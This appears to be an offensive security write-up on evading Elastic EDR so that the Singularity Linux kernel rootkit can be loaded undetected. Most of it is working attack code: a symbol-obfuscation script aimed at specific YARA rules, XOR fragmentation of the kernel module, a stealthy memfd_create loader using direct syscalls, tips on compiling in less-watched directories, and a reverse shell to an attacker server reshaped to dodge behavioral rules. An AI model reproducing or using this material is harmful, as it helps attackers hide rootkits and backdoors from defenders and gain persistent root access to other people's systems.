Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works 